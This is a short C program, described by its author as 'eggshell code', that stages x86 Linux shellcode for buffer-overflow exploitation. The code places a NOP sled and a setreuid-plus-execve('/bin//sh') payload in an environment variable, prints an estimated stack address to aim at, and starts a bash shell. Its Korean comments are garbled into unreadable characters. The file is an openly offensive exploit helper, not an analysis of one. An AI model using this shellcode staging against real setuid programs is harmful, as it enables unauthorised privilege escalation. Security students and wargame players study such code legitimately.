/*
 * Author : superdk@hanmail.net
 * DATA : eggshell code
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET          0
#define DEFAULT_ADDR_SIZE		8
#define DEFAULT_BUFFER_SIZE     512
#define DEFAULT_SUPERDK_SIZE    2048
#define NOP       				0x90


// ��ü��� �����Ű�� ���ڵ�
char shellcode[] =
	"\x66\xbb\x1c\x0c\x66\xb9\x1c\x0c\x31\xc0\xb0\x46\xcd\x80"
	"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

// ����������(SP) �� �������� �Լ�
unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}


int main(int argc, char **argv)
{
	char    *ptr, *superSH;
	char    shAddr[DEFAULT_ADDR_SIZE + 1];
	char    cmdBuf[DEFAULT_BUFFER_SIZE];
	long    *addr_ptr, addr;
	int     offset=DEFAULT_OFFSET;
	int     i, supershLen=DEFAULT_SUPERDK_SIZE;
	int     chgDec[3];

	// ���ڵ带 �ø� ������ �ּҿ� ���� �޸� �Ҵ�
	if ( !(superSH = malloc(supershLen)) )
	{
		printf("Can't allocate memory for supershLen");
		exit(0);
	}

	// ���ڵ��� �ּ� �о�ͼ� ȭ�鿡 ���
	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);

	// ���ڵ� ���� Ȯ���� ���̱� ���ؼ�, ���ڵ� �տ� ����� NOP �߰�
	ptr = superSH;
	for(i = 0; i < supershLen - strlen(shellcode) - 1; i++)
		*(ptr++) = NOP;

	// NOP �ڿ� ���ڵ� �߰�
	for(i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];

	// �迭�� ���� ��Ȯ�� �˷��ֱ� ���� ���ڿ��� �� ǥ��
	superSH[supershLen - 1] = '\0';

	// SUPERDK ��� ȯ�溯�������� ���ڵ带 ȯ�� ������ ���
	memcpy(superSH, "SUPERDK=", DEFAULT_ADDR_SIZE);
	putenv(superSH);

	// ���ο� ��ü� ����
	system("/bin/bash");
}
